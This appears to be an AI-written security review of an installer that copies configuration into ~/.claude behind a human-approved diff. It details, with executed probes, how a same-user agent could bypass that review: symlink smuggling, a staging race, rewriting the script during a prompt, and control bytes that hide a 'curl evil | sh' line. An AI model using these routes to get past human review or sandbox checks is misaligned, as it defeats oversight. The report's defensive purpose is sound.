Commit: d0fdd04

# Security Review — `ans/copy-install` (host `~/.claude` copy install)

**Scope:** diff `712c626..d0fdd04`: `devcontainer-config/install.sh` (read whole, 464 lines; focus on `assemble`, `review_diff`, `confirm` and `install_claude_home` and its helpers), README.md, decisions 035/037, `guides/bare-host-hook-wiring.md`, `guides/README.md`, `test/install-host.bats`, `test/link-claude-home-wiring.bats`. The `docs/working/*` and `docs/reviews/{pre-mortem,architecture-review}-copy-install.md` files were read as context only.
**Date:** 2026-09-23
**Based on:** `docs/reviews/code-fact-check-report.md` (k=3 merged, Commit d0fdd04), including its Claims Requiring Attention, every `Replicate annotations` line and Escalations E1–E10.
**Probe evidence:** `/tmp/claude-1000/-workspace/d516ca2c-2abb-4732-a34a-041aa98280c8/scratchpad/sec-copy/` (`lib.sh`, `p1-symlink-smuggle.sh`/`p1.log`, `p2-p3-races.sh`/`p2p3.log`, `p5-partial.sh`/`p5.log`, `p6-guard-bypass.sh`/`p6.log`, `p4/`). Every probe ran hermetically: HOME, CLAUDE_HOME_DIR, CLAUDE_DEVC_CONFIG_DIR, CLAUDE_DEVC_BIN_DIR and TMPDIR were under the scratch dir, the installer was a copy inside a throwaway git repo built like `test/install-host.bats`'s `fake_repo`, CLAUDECODE was unset for the child, and the pty came from `script -qec`. Nothing touched the real `~/.claude`, `~/.config` or `~/.local`.

**Threat model used.** The one the diff states itself (`install.sh:12-21`, decision 037 Context): the checkout is **agent-writable**, and the new host target's job is to make agent edits to the checkout **inert until a human reads the review diff and types y**. The documented hard backstop is sandbox `denyWrite ~/.claude` (037:50, plan Risks). So the attacker is a same-uid agent that can write the checkout (and, when its sandbox allows it, other paths outside `~/.claude`), and cannot write `~/.claude` directly. A finding means an agent-controlled change reaches the live `~/.claude` without appearing in the review, or the live `~/.claude` ends up in a weaker state than before the run.

## Trust Boundary Map

```
B1 (new): [checkout: files, names, symlinks (S1)] → [assemble cp -r → stage → review_diff → human y] → [cp -R/mv into live ~/.claude (policy: CLAUDE.md, hooks, skills)]
B2 (new): [stage dir $TMPDIR/cw-host-stage.* (S3)] → [nothing re-checks it after the diff] → [cp -R into live ~/.claude]
B3:       [install.sh bytes in the checkout (S2)] → [bash reads the script incrementally while it waits at a prompt] → [human's unsandboxed shell]
B4 (new): [--yes / CLAUDECODE / [ -t 0 ] (S6)] → [skip rules :293-304] → [host install allowed ("a human at a terminal")]
B5 (new): [existing ~/.claude entries, settings.json (S5)] → [dest guards :310-331, pre-pass :345-369, move-aside :410-437] → [backup dir + live ~/.claude, wired hooks]
B6:       [checkout bytes and file names (S1)] → [review_diff / echo to the terminal] → [human's y/N decision]
```

| Label | Source | Mutability | Trust classification (per sink class) |
|---|---|---|---|
| S1 | Checkout content: file bytes, file names, symlinks, including a committed symlink | runtime-mutable (agent-writable) | UNTRUSTED toward install into `~/.claude` (the review is meant to be the only gate), toward terminal output (control bytes), and toward path sinks (a link target is an arbitrary path) |
| S2 | `install.sh` itself, from the checkout | runtime-mutable (agent-writable) | Trusted for execution only through 035's commit-time gate; UNTRUSTED **during** a run, because the gate never sees bytes written and reverted mid-run |
| S3 | Stage dir `$TMPDIR/cw-host-stage.XXXXXX/payload` | runtime-mutable (mode 0700, but same uid as the agent) | UNTRUSTED toward the install sink after the diff has been shown. Its reachability by a sandboxed agent depends on the sandbox's write allowlist covering the human's `$TMPDIR` (default `/tmp`) |
| S4 | `CLAUDE_HOME_DIR` / `CLAUDE_CONFIG_DIR` / `TMPDIR` / `HOME` in the human's shell | deploy-time (the human's own environment) | trusted for choosing paths; the host target is skipped when CLAUDECODE is set, so a session's `CLAUDE_CONFIG_DIR` does not reach it by accident |
| S5 | Existing `~/.claude` contents (old links, foreign files, `settings*.json`) | runtime-mutable by the user; not by a sandboxed agent (under denyWrite, assumed) | trusted-with-guards for path sinks (move-aside, never write-through) |
| S6 | `--yes`, `CLAUDECODE`, stdin-is-a-TTY | request-time, forgeable by any same-uid process | UNTRUSTED as proof that a human is present (fact-check Claims 2 and 14); fine as an accident filter |
| S7 | `git rev-parse` / `git status` / `ps -o comm=` output → manifest | request-time | informational only. Not an audit authority (fact-check Claim 22) |

What enters from outside: everything under S1–S3 is writable by the agent the design is guarding against, and the diff's security claim rests on the review diff being a **faithful and final** view of what is copied. Three things break that. The diff follows symlinks that are then installed as symlinks (B1). The staged snapshot can change after it is shown (B2). And the script that renders the diff can itself be rewritten while it runs (B3). The dest-side guards (B5) hold against every bypass I tried, within their stated scope.

## Findings

#### 1. Symlinks in the checkout pass the review as "(none)" and are installed into live `~/.claude` as symlinks to agent-writable paths

**Severity:** High
**Location:** `devcontainer-config/install.sh:108-110` (stage copy), `:145` (diff follows links), `:399` (`cp -R` keeps links)
**Boundary:** B1 (and B6)
**Move:** 1 (trust boundaries), 2 (implicit sanitization assumption), 12 (sweep of fs-write primitives)
**Confidence:** High (executed, P1)
**Legibility-target:** for-author

**Evidence:**
```
      cp -r "$REPO_ROOT/$item" "$stage/$(basename "$item")"
```
(`:110`)
```
    diff -ruN "$dest/$item" "$src/$item" || rc=$?
```
(`:145`)
```
      if ! cp -R "$stage/$name" "$dest/.cw-new.$name"; then ok=0; break; fi
```
(`:399`)

GNU `cp -r`/`cp -R` copies a symlink as a symlink. `diff -ruN` follows it and compares the **target's** bytes. The pre-pass (`:345-369`) looks for links only in the *destination*, never in the stage. So an agent can replace `hooks/guard-trusted-writes.py` (or any payload file, or a whole top-level entry such as `skills`) in the checkout with an absolute symlink to a file it controls outside `~/.claude`, holding the same bytes. The review then shows nothing for that file, and the installer puts **a symlink** into live `~/.claude`. Executed in P1: after the swap the review printed `(none — the destination already matches the repo)`, `~/.claude/hooks/guard.sh` became `-> …/agent/guard.sh`, and a later edit to the agent's file, with no install run, changed the live hook (`echo PWNED`). In P1b a top-level `skills -> …/agent/skills` got no review line at all and was installed as a link. The review also printed `REPLACE symlink … guard.sh -> …/agent/guard.sh with a copy` for the old link and then installed a link again, so the "with a copy" text was false.

This recreates the exact hazard decision 037 exists to remove: live policy files that track an agent-writable path with no review. It also sidesteps the documented backstop. `denyWrite ~/.claude` does not cover the link target, and the human's unsandboxed installer does the write. The only incidental signal is the `uncommitted changes` warning, and that goes away once the agent commits the symlink. The plan assumes the precondition without enforcing it (`plan-copy-install-bare-host.md` Risks: "`cp -R` of a stage with no symlinks behaves the same"). Fact-check r1 found the repo payload has no symlinks today (Claim 29 annotation), so refusing links costs nothing.

**Recommendation:** In `assemble` (both targets use it), after staging, run `find "$stage" -type l`. If it prints anything, fail with the list, as the missing-source check does (fatal, nothing installed). Add a bats test: a checkout hook replaced by a same-content absolute symlink must exit non-zero with the path named, and the destination must stay unchanged.

#### 2. The staged snapshot is not re-checked after the review, so a same-uid write during the `[y/N]` wait installs unreviewed content

**Severity:** High
**Location:** `devcontainer-config/install.sh:333-335`, `:372`, `:386`, `:397-399`
**Boundary:** B2
**Move:** 4 (TOCTOU)
**Confidence:** Medium. The mechanism is executed (P2). Whether a *sandboxed* agent can reach it depends on the sandbox write allowlist covering the human's `$TMPDIR` (default `/tmp`), which I did not establish.
**Legibility-target:** for-author

**Evidence:**
```
  HOST_TMP="$(mktemp -d "${TMPDIR:-/tmp}/cw-host-stage.XXXXXX")"
  local stage="$HOST_TMP/payload"
  assemble "$stage"
```
(`:333-335`)
```
  if ! confirm "Install these files into $dest?"; then
```
(`:386`)

The review compares `$dest` against `$stage`, and the install copies from `$stage` after the human's y. Nothing binds the two. The directory is 0700, but the agent has the same uid, and the name is discoverable with a glob (`cw-host-stage.*`). The human reads the diff at the prompt, so the window is seconds to minutes. In P2 a background process rewrote `payload/hooks/guard.sh` two seconds into the prompt. The review showed `(none …)`, the human answered y, and live `guard.sh` became `echo UNREVIEWED`. The plan accepts this as "not closable within a same-user model" (Risks, last bullets). That premise is wrong for the threat model the design actually relies on. The backstop is `denyWrite ~/.claude`, and a stage placed **under `$dest`** (e.g. `$dest/.cw-stage.XXXXXX`) sits behind that same backstop. A post-prompt integrity check closes it even without a sandbox.

**Recommendation:** Stage inside `$dest`, where the documented `denyWrite ~/.claude` covers it (add a guard that it is not a symlink). Also record a content hash of the stage right after `assemble` (for example `find … -printf '%p %y %l\n'` plus `sha256sum` of the files, as `test/install-host.bats`'s `snap` does). Recompute it after `confirm`, and refuse on a mismatch. Update the plan's Risks bullet.

#### 3. `install.sh` can be rewritten in place while it waits at a prompt, and bash executes the new bytes, with no git trace and even after "n"

**Severity:** High (pre-existing mechanism; this diff adds a second, longer prompt and widens what the script is trusted to do)
**Location:** `devcontainer-config/install.sh:461-464` (top-level tail read after the prompts), `:191`, `:386`
**Boundary:** B3
**Move:** 4 (TOCTOU), 1
**Confidence:** High (executed, P3)
**Legibility-target:** for-author

**Evidence:**
```
DECLINED=0
install_devcontainer
install_claude_home
exit "$DECLINED"
```
(`:461-464`)

Bash reads a script file incrementally and executes each top-level command as it reaches it. The last two lines are read only after both prompts return. In P3 a background process rewrote `install.sh` in place (same inode) while the human sat at the first prompt, appending a command before `exit`, and then ran `git checkout` to revert the file. The human answered **n** to both targets. The injected command still ran as the human's user (`[injected] ran after the prompt: node`, `$HOME/INJECTED` created). `git status` was clean afterwards. That is arbitrary code in the human's unsandboxed shell, which can write `~/.claude` directly. It evades 035's commit-time `Live-verified` gate entirely, and 035's new note (`035-install-sh-gating.md`, "Until it lands, every install.sh commit still carries a `Live-verified:` trailer") presents that gate as the control for install.sh. The header claim that agent edits "are inert until a human runs this script and approves the diff" (`:14-15`) does not hold. The mechanism predates this branch. The branch keeps it and makes it matter more (037 Consequences: "an agent edit to it has a wider blast radius").

**Recommendation:** Make bash parse the whole program before the first prompt. Wrap lines 25–464 in `main() { … }` and end the file with a single line `main "$@"; exit $?`. A function body is parsed completely, and a trailing `exit` on the same line leaves nothing to read later. Add a test that appends to the script during a pty prompt and asserts the appended line does not run.

#### 4. The review diff passes raw control bytes from the checkout to the terminal, so a `\r` or CSI sequence can hide `+` lines from the human

**Severity:** Medium
**Location:** `devcontainer-config/install.sh:145` (also the name echoes at `:347`, `:351`, `:361`)
**Boundary:** B6
**Move:** 2, 11
**Confidence:** Medium. It is executed that raw `\r` reaches the output (`p4/`: `od -c` shows `+ c u r l … | s h \r # c o m m e n t …`). The terminal rendering is inferred from standard carriage-return/CSI semantics and was not observed on a real terminal.
**Legibility-target:** for-author

**Evidence:**
```
    diff -ruN "$dest/$item" "$src/$item" || rc=$?
```
(`:145`)

The diff is the gate (`:23` "read the diff. It is the rebuild gate."), but its output is untrusted checkout bytes rendered by a terminal. A line such as `curl evil | sh\r# comment` shows as a harmless comment. Cursor-up and erase-line sequences (`ESC[1A ESC[2K`) can remove whole hunks from view. File names in `REPLACE`/`MOVE` lines carry the same risk. The devcontainer target already had this through the same `review_diff`. The host target now relies on it for the live `~/.claude`.

**Recommendation:** Pipe the review output through a filter that makes non-printing bytes visible (e.g. `LC_ALL=C sed 's/[^[:print:]\t]/?/g'` or `cat -v`), keeping `diff`'s exit status (use `PIPESTATUS`). Or refuse a payload containing bytes other than tab, LF and printable ones in text files.

#### 5. A failure or concurrent run between move-aside and swap-in leaves live `~/.claude` without `hooks/` and `CLAUDE.md`, and wired guard hooks then fail open

**Severity:** Medium
**Location:** `devcontainer-config/install.sh:423-437`
**Boundary:** B5
**Move:** 3 (error path), 8 (concurrency)
**Confidence:** High for the state (executed, P5; fact-check E2 and E7). Medium for fail-open, which is inferred from the guide's own statement below.
**Legibility-target:** for-author

**Evidence:**
```
    for name in "${CLAUDE_HOME_NAMES[@]}"; do
      if [ -e "$dest/$name" ] || [ -L "$dest/$name" ]; then
        mv "$dest/$name" "$backup/$name"
      fi
    done
```
(`:423-427`), and `guides/bare-host-hook-wiring.md:32-33`: "A wired `bash <missing path>` exits 127, which Claude Code shows as a non-blocking error on every matching tool call."

Step 2 moves all seven live entries before step 3 moves any new one in, and under `set -e` any `mv` failure exits with no rollback. In P5, `mv scripts` failed with `Permission denied`. The live destination was left with no `CLAUDE.md` and no `hooks/` (both moved to the backup), all seven `.cw-new.*` stranded, and only `mv`'s own error printed. Nothing named the backup dir or said how to recover. Fact-check r2's E5b showed two concurrent runs ending with **none** of the seven entries. The security consequence goes beyond availability. `settings.json` still wires `~/.claude/hooks/guard-trusted-writes.py` and the other permission-path hooks. By the guide's own statement a missing hook is a non-blocking error, so the guard tier fails open for every later session until someone repairs it by hand. The plan's Risks treats the swap window as momentary and mitigates it with "close your sessions". This persistent partial state is not covered.

**Recommendation:** Swap per entry (move old `name` to the backup, then immediately move `.cw-new.name` into place) so at most one entry is ever absent. Add an `ERR`/EXIT handler that moves already-backed-up entries back when the swap does not complete, and prints the backup path and the plan's Rollback commands. Take an exclusive lock for the whole host target (for example `mkdir "$dest/.cw-install.lock"`, removed by the trap).

#### 6. The human-presence gate is described as absolute, and the audit trace 037 relies on for detection is evadable

**Severity:** Medium
**Location:** `README.md:21-23`, `devcontainer-config/install.sh:40-43`, `:445`; `docs/decisions/037-bare-host-copy-install.md:64`
**Boundary:** B4
**Move:** 5 (invert the access control model), 11
**Confidence:** High (fact-check Claims 2 and 22 are Incorrect, executed by r1–r3)
**Legibility-target:** for-orchestrator-synthesis

**Evidence:**
```
target only installs for a human at a terminal. It is skipped with `--yes`, from a
script with no TTY, and inside a Claude Code session. `install.sh --help` has the
```
(`README.md:22-23`)
```
    echo "installed_parent=$(ps -o comm= -p "$PPID" 2>/dev/null | tr -d ' ' || echo unknown)"
```
(`:445`)

Bypass candidates for the skip rules: (a) `env -u CLAUDECODE script -qec … /dev/null`. This is tested, it installs, and it is how the branch's own suite drives the y path. (b) `script` with `SHELL=/bin/sh` or a compound command, so `installed_parent` records `sh`/`bash` instead of `script`. Tested by fact-check r2/r3. (c) The agent needs no installer at all when it is not sandboxed, because it can `cp` into `~/.claude` directly. The code comment (`:290-292`) and 037 are honest about this. The README and `--help`, which the user actually reads before the plan-step-9 host run, are not. A user who believes "only a human" has no reason to add the `denyWrite ~/.claude` backstop, which is the one real barrier (plan Risks: "A host without that sandbox setting has no hard barrier"). 037's revisit trigger ("backup stamp with no human at the terminal") has no reliable signal to fire on.

**Recommendation:** Reword README and `--help` to match `:290-292`: the skips stop accidents, and `denyWrite ~/.claude` is the barrier. State in the README's migration steps that `denyWrite ~/.claude` should be in place first. Drop `installed_parent` from the evidence 037's revisit trigger depends on, or record the whole ancestor chain (`ps -o comm= -p` walked up from `$PPID`) and call it best-effort.

#### 7. The review can mislabel what happens to hooks: foreign per-file links print "REPLACE … with a copy", and the WIRED check matches only `hooks/<basename>`

**Severity:** Medium (floor rule: a named mechanism by which the review fails to flag a wired hook that is about to be disabled)
**Location:** `devcontainer-config/install.sh:350-353`, `:362`
**Boundary:** B5, B6
**Move:** 11
**Confidence:** Low for impact (the `MOVE to backup` line is still printed). High for the mechanism (fact-check Claim 16 is Incorrect; E6).
**Legibility-target:** for-author

**Evidence:**
```
        if [ "$name" = hooks ] && grep -qsF "hooks/$(basename "$f")" "$dest/settings.json" "$dest/settings.local.json"; then
```
(`:362`)

A user's own security hook at `~/.claude/hooks/sub/check.sh`, wired as `…/hooks/sub/check.sh`, is looked up as `hooks/check.sh`. It is moved without the `WIRED` warning, and per Finding 5's guide quote the hook then fails open. Hooks wired from managed settings or project settings are not consulted. A foreign per-file link gets a `REPLACE … with a copy` line although no copy replaces it. In the Finding 1 scenario that same text appeared above a link that was re-installed as a link.

**Recommendation:** Grep for the path relative to `$dest` (`hooks/$rel`), print `REPLACE` only when the stage has that path (otherwise just `MOVE`), and state in the review which settings files were checked for wiring.

#### 8. A `~/.claude` that is itself a symlink to a directory outside the checkout is written through, and the review does not say so

**Severity:** Informational
**Location:** `devcontainer-config/install.sh:307-318`
**Boundary:** B5
**Move:** 1
**Confidence:** High (fact-check Claim 15 annotation, executed r1/r2/r3; E5)
**Legibility-target:** for-author

**Evidence:**
```
  if inside_repo "$(resolve_phys "$dest")"; then
```
(`:316`)

Only the user can create that link (a sandboxed agent cannot write `~/.claude`), so this is not attacker-reachable within the model. The human should still see where the files actually go. **Recommendation:** when `-L "$dest"`, print `Destination: $dest -> $(resolve_phys "$dest")` on the Destination line.

## Untested bypass candidates

- **Dest-guard via a bind mount of the checkout** (`mount --bind checkout ~/.claude-alt`, then `CLAUDE_HOME_DIR=~/.claude-alt`). `pwd -P` does not see through bind mounts. Not tested: it needs mount privileges in the sandbox. Only the user can set this up. (Tested and refused: trailing slash, relative `../repo/sub/new`, dot segments, a symlinked ancestor. See `p6.log`.)
- **Binary payload files.** A NUL byte makes `diff` print only `Binary files … differ`, so the reviewer sees that something changed but not what. Not tested. It matters only for a file some wired hook executes (`hooks/lib/*`, `scripts/*`).
- **macOS/BSD** `script`, `find -print0`, `sort -z`, `cp -R` symlink semantics (fact-check E8). Not tested.
- **Finding 2 under a real Claude Code sandbox**: whether the sandbox write allowlist includes the human's `/tmp` (as opposed to only a per-session `$TMPDIR`). Not tested.

## Endorsement Claims

- **Claim:** With the README's old install (top-level entries and per-file hook links into the checkout), a y moves each old link into `.claude-workflows-backup/<stamp>/` as a link, and no checkout file's bytes or listing change.
  **Location:** `devcontainer-config/install.sh:408-437`
  **Evidence:** executed (fact-check Claims 15, 19, 28, r1–r3; T5/T21 in `test/install-host.bats`)
  **Verified:** checkout checksums before and after a pty `n\ny` run, with links to the checkout in the destination.
  **Not verified:** a checkout reached through a bind mount rather than a symlink (see Untested bypass candidates).
  **route: code-fact-check**
- **Claim:** The `resolves inside the repo checkout` dest guard refused four spellings of a checkout path: trailing slash, relative non-existent path, dot segments, and a symlinked ancestor.
  **Location:** `devcontainer-config/install.sh:255-271`, `:316-318`
  **Evidence:** executed (`p6.log`)
  **Verified:** each run printed the ERROR and exited before staging. The repo's `git status` was unchanged.
  **Not verified:** the bind-mount candidate above. Because of that open candidate, this is a scoped observation, not an endorsement of the guard.
- **Claim:** The skip rules run before `mktemp`/`assemble`, so a `--yes`, no-TTY or CLAUDECODE run creates no stage and writes nothing under the host destination.
  **Location:** `devcontainer-config/install.sh:293-304`, `:333-335`
  **Evidence:** executed (fact-check Claims 12, 32; T1/T3)
  **Verified:** no `cw-host-stage.*` left and destination checksums unchanged after closed-stdin and `--yes` runs.
  **Not verified:** runs in which the checkout's `install.sh` is modified mid-run (Finding 3).
  **route: code-fact-check**
- **Claim:** A y leaves `settings.json`, `settings.local.json`, `projects/`, `memory/`, `logs/` and `.credentials.json` byte-identical.
  **Location:** `devcontainer-config/install.sh:392-447`
  **Evidence:** executed (fact-check Claim 6, T7)
  **Verified:** checksums before and after a successful pty install.
  **Not verified:** the same files after a step-2/step-3 failure (Finding 5). Those paths are not in the move list, but this was not run.
  **route: code-fact-check**

## Primitive sweep

Primitive: filesystem write / move / delete with constructed paths (path sinks)

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `install.sh:99-100` `rm -rf`/`mkdir -p "$stage"` | S3 (mktemp path) / `$SRC/claude-home` | mktemp; fixed name | cleared — path is script-constructed |
| `install.sh:110` `cp -r "$REPO_ROOT/$item"` → stage | S1 | missing-source check only | **Finding 1** (symlinks copied as links) |
| `install.sh:123-127` write `.manifest` into stage | S7 | none needed | cleared — stage is freshly created |
| `install.sh:253` trap `rm -rf "$HOST_TMP"` | S3 | set only by mktemp | cleared |
| `install.sh:333` `mktemp -d` | S4 TMPDIR | mktemp 0700 | **Finding 2** (same-uid writable) |
| `install.sh:395` `mkdir -p "$dest"` | S4 | dest guards :310-318 | cleared — guards executed in P6 |
| `install.sh:398`, `:403`, `:419` `rm -rf "$dest/.cw-new.$name"` | S4 + constant names | `-L` refusal :327-331 | cleared — `rm -rf` on a link removes the link; a real dir is ours |
| `install.sh:399` `cp -R stage → .cw-new` | S3 (from S1) | none on content | **Finding 1**, **Finding 2** |
| `install.sh:418` `mkdir -p "$backup"` | S5 bkroot | `-L` refusal :320-325; `.$$` suffix | cleared within model (only a `~/.claude` writer can plant a link; fact-check Claim 15 annotation) |
| `install.sh:425` `mv "$dest/$name" "$backup/$name"` | S5 | no trailing slash; links moved as links | **Finding 5** (no rollback on failure) |
| `install.sh:436` `mv .cw-new → "$dest/$name"` | S3 | reappearance check :432-435 | **Finding 5** |
| `install.sh:441-447` `rm -f` + `cp` + `>>` manifest | S3, S7 | `rm -f` first | cleared within model (the rm→cp race needs a `~/.claude` writer) |
| `install.sh:209-210` `rm -rf "${DEST:?}/$item"` + `cp -r` (devcontainer) | S1 via `$SRC` | `:?` | not analyzed beyond noting that Finding 1's symlink copy applies to the devcontainer payload too (pre-existing, out of this diff's host scope) |
| `install.sh:215` `ln -sf` (devcontainer) | S4 | none | not analyzed — unchanged by this diff |

Primitive: untrusted bytes to the terminal (review rendering)

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `install.sh:145` `diff -ruN` output | S1 | none | **Finding 4** |
| `install.sh:347`, `:351` `readlink` in REPLACE lines | S5 (link targets) | none | cleared within model — S5 is not agent-writable under denyWrite |
| `install.sh:361` `MOVE … $f` | S5 names | none | cleared within model (same reason) |

Primitive: process exec / script interpretation

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| bash's incremental read of `install.sh` (`:461-464`) | S2 | none | **Finding 3** |
| `install.sh:219` `"$DEST/cc-isolated.sh" --bless` | S1 via the just-installed copy | the devcontainer review | not analyzed — unchanged by this diff |
| `install.sh:445` `ps -o comm= -p "$PPID"` | S7 | none needed | cleared as exec; its value is Finding 6 |

Two rows (devcontainer `:209-215`, `:219`) are left not analyzed because this diff does not change them, so the sweep is partial for the devcontainer target.

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | Checkout symlinks pass review as "(none)" and install as links to agent-writable paths | High | B1, B6 | `install.sh:110,145,399` | High |
| 2 | Stage not re-checked after the prompt; same-uid write installs unreviewed content | High | B2 | `install.sh:333-335,386,399` | Medium |
| 3 | In-place edit of install.sh mid-prompt executes, no git trace, even after "n" (pre-existing, widened) | High | B3 | `install.sh:461-464` | High |
| 4 | Raw control bytes in the review diff can hide `+` lines | Medium | B6 | `install.sh:145` | Medium |
| 5 | Mid-swap failure or concurrent run strips `hooks/` and `CLAUDE.md`; wired guards fail open | Medium | B5 | `install.sh:423-437` | High (state) / Medium (fail-open) |
| 6 | "Only a human" overclaimed in README/--help; `installed_parent` audit trace evadable | Medium | B4 | `README.md:22-23`, `install.sh:40-43,445` | High |
| 7 | REPLACE mislabel and basename-only WIRED check | Medium | B5, B6 | `install.sh:350-353,362` | Low |
| 8 | Symlinked `~/.claude` written through without notice | Informational | B5 | `install.sh:307-318` | High |

## Overall Assessment

The destination side is careful. Move-aside instead of `rm -rf`/`cp -r` through links, refusals for checkout-resolving destinations, backup dirs and `.cw-new` links, and leaving `settings.json` alone all held under execution. The weakness is on the **source** side of the gate. The design promises that the review diff is a faithful and final picture of what reaches `~/.claude`, and three agent-reachable mechanisms break that. Symlinks in the checkout are reviewed by their target's content and installed as links (Finding 1: no race needed, and it survives the documented `denyWrite ~/.claude` backstop). The staged snapshot can change after it is shown (Finding 2). The installer itself can be rewritten mid-run (Finding 3). All three can be fixed in place, cheaply, without an architecture change: refuse links in the stage, stage under `$dest` plus a post-prompt hash check, and wrap the script in `main`. Finding 1 is the single most important one to fix before the user's plan-step-9 host run: it is deterministic, invisible in the review, and it recreates the symlink-into-writable-path state the branch exists to remove. Findings 5 and 6 should also land before that run, because the host run is when a partial install or a missing `denyWrite` would bite. Not safe to merge as-is. For the paths not covered by findings: no findings within the code paths read; endorsement claims pending execution verification.

## Goal-Alignment Note
- Success criterion (restated verbatim): a markdown report saved at the output path your task names, structured per your skill, beginning with a `Commit: d0fdd04` line.
- Answered: yes
- Out of scope: devcontainer-target rows `:209-215` and `:219` (unchanged by this diff); macOS/BSD behavior; whether the real Claude Code sandbox write allowlist reaches the human's `/tmp` (governs Finding 2's reachability)
- Escalate: Findings 1 and 3 should be fixed before the plan-step-9 host run. Both let an agent change live `~/.claude` without anything appearing in the review or in git, and Finding 1 survives the `denyWrite ~/.claude` backstop. The plan's Risks bullet calling the stage TOCTOU "not closable within a same-user model" should be revisited (Finding 2 recommendation).
